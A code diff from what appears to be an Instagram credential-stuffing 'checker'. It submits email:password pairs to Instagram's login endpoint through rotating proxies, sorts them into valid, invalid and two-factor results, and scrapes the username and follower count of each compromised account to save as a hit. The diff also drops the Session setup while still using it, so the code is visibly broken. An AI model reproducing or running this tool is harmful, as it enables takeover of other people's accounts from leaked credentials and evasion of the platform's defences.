@@ -1,4 +1,3 @@
-from time import sleep
 from modules.variables import Checker
 from requests import Session,get
 from modules.functions import bad_proxy, log, return_proxy,save,set_proxy
@@ -37,31 +36,30 @@ def check(email:str,password:str):
                 }
                 data = f"username={email}&enc_password=%23PWD_INSTAGRAM_BROWSER%3a0%3a1628896342%3a{password}" 
 
-                with Session() as s:
-                    response = s.post("https://www.instagram.com/accounts/login/ajax/",data=data,headers=headers)
-                    if "\"authenticated\":false" in response.text or "\"user\":false" in response.text:
-                        Checker.bad += 1
-                        return_proxy(proxy)
-                    elif "\"two_factor_required\":true" in response.text or "\"checkpoint_required\"" in response.text:
-                        Checker.custom += 1
-                        return_proxy(proxy)
-                        if not Checker.cui: log("custom",":".join([email,password]),"Instagram")
-                        save("Instagram","custom",Checker.time,":".join([email,password]))
-                        return
-                    elif "\"authenticated\":true" not in response.text:
-                        raise
-
-                    username = s.get("https://www.instagram.com/accounts/edit/").text.split(r"\"username\":\"")[1].split(r"\",\"")[0]
-                    followers = s.get(f"https://www.instagram.com/{username}/").text.split('" name="description"')[0].split('<meta content="')[1].split(' Followers')[0]
-                    
-                    Checker.good += 1
+                response = s.post("https://www.instagram.com/accounts/login/ajax/",data=data,headers=headers)
+                if "\"authenticated\":false" in response.text or "\"user\":false" in response.text:
+                    Checker.bad += 1
                     return_proxy(proxy)
-                    if not Checker.cui: log("good",":".join([email,password]),"Instagram")
-                    save("Instagram","good",Checker.time,":".join([email,password])+f" | Username: {username} | Followers: {followers}")
+                elif "\"two_factor_required\":true" in response.text or "\"checkpoint_required\"" in response.text:
+                    Checker.custom += 1
+                    return_proxy(proxy)
+                    if not Checker.cui: log("custom",":".join([email,password]),"Instagram")
+                    save("Instagram","custom",Checker.time,":".join([email,password])+' | 2FA')
                     return
+                elif "\"authenticated\":true" not in response.text:
+                    raise
+
+                username = s.get("https://www.instagram.com/accounts/edit/").text.split(r"\"username\":\"")[1].split(r"\",\"")[0]
+                followers = s.get(f"https://www.instagram.com/{username}/").text.split('" name="description"')[0].split('<meta content="')[1].split(' Followers')[0]
+                
+                Checker.good += 1
+                return_proxy(proxy)
+                if not Checker.cui: log("good",":".join([email,password]),"Instagram")
+                save("Instagram","good",Checker.time,":".join([email,password])+f" | Username: {username} | Followers: {followers}")
+                return
         except:
             bad_proxy(proxy)
             return_proxy(proxy)
             Checker.errors += 1
 
-        sleep(0.1)
+        
